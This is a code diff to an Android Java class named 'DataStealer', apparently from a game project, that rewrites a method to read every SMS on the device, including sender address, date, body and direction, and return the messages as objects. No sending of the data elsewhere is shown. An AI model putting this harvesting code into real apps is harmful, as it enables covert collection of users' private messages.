@@ -19,12 +19,12 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.concurrent.TimeUnit;
 
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
+import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
 import de.hpi3d.gamepgrog.trap.future.Consumer;
 
 
@@ -34,50 +34,48 @@ public class DataStealer {
     private LocationCallback locationCallback;
 
 
-    public static ArrayList<Object> takeMessageData(Context context) {
-
+    public static ArrayList<TextMessage> takeMessageData(Context context) {
         String[] projection = new String[]{
-                Telephony.Sms.PERSON,
+                Telephony.Sms._ID,
                 Telephony.Sms.ADDRESS,
                 Telephony.Sms.DATE_SENT,
                 Telephony.Sms.BODY,
-                Telephony.Sms._ID,
-                Telephony.Sms.CREATOR
+                Telephony.Sms.TYPE,
         };
 
         Cursor cursor = context.getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
-                null,
+                projection,
                 null,
                 null,
                 null);
 
-
-        Log.d("SMS_DEBUG", Arrays.toString(cursor.getColumnNames()));
+        ArrayList<TextMessage> textMessages = new ArrayList<>();
 
         if (null != cursor && cursor.moveToFirst()) {
+            int positionOfIdColumn = cursor.getColumnIndex(Telephony.Sms._ID);
             int positionOfAddressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
             int positionOfDateSentColumn = cursor.getColumnIndex(Telephony.Sms.DATE_SENT);
             int positionOfBodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
-            int positionOfSubjectColumn = cursor.getColumnIndex(Telephony.Sms.SUBJECT);
-
-            int positionOfIdColumn = cursor.getColumnIndex(Telephony.Sms._ID);
+            int positionOfMessageTypeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);
 
             do {
-                String address = "ADDRESS: " + cursor.getString(positionOfAddressColumn);
-                String date = "DATE: " + cursor.getString(positionOfDateSentColumn);
-                String recDate = "REC_DATE: " + cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE_SENT));
-                String body = "BODY: " + cursor.getString(positionOfBodyColumn);
+                long id = cursor.getLong(positionOfIdColumn);
+                String address = cursor.getString(positionOfAddressColumn);
+                long dateSent = cursor.getLong(positionOfDateSentColumn);
+                String body = cursor.getString(positionOfBodyColumn);
+                int typeFlag = cursor.getInt(positionOfMessageTypeColumn);
 
-                Log.d("SMS READ:", recDate + "\n" + address + "\n" + date + "\n" + body + "\n");
+                boolean inbound = typeFlag == Telephony.Sms.MESSAGE_TYPE_INBOX;
 
-                if (address.equals("ADDRESS: Telegram")) {
-                }
+                TextMessage textMessage = new TextMessage(id, dateSent, body, address, inbound);
+                textMessages.add(textMessage);
+
             } while (cursor.moveToNext());
             cursor.close();
         }
 
-        return null;
+        return textMessages;
     }
 
     /**
